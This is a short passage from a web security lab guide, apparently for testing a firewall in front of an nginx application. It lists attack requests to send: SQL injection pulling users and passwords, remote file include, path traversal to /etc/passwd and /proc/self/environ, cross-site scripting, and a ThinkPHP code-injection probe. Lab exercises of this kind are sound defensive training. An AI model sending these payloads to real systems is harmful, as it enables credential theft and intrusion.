FROM https://nginx-openshift-lab.readthedocs.io/en/latest/class1/module2/lab2.html

Execute the attack by appending such string as ?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+ to the end of the application URL.
	• SQL Injection - GET /?hfsagrs=-1+union+select+user%2Cpassword+from+users+--+
	• Remote File Include - GET /?hfsagrs=php%3A%2F%2Ffilter%2Fresource%3Dhttp%3A%2F%2Fgoogle.com%2Fsearch
	• Command Execution - GET /?hfsagrs=%2Fproc%2Fself%2Fenviron
	• HTTP Parser Attack - GET /?XDEBUG_SESSION_START=phpstorm
	• Predictable Resource Location Path Traversal - GET /lua/login.lua?referer=google.com%2F&hfsagrs=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
	• Cross Site Scripting - GET /lua/login.lua?referer=google.com%2F&hfsagrs=+oNmouseoVer%3Dbfet%28%29+
	• Informtion Leakage - GET /lua/login.lua?referer=google.com%2F&hfsagrs=efw
	• HTTP Parser Attack Forceful Browsing - GET /dana-na/auth/url_default/welcome.cgi
	• Non-browser Client,Abuse of Functionality,Server Side Code Injection,HTTP Parser Attack - GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
	• Cross Site Scripting - GET / HTTP/1.1\r\nHost: <ATTACKED HOST>\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nCookie: hfsagrs=%27%22%5C%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E\r\n\r\n"
	
##more
/search?query=1'+OR+'1'='1"
/comment?text=<script>alert('XSS')</script>"
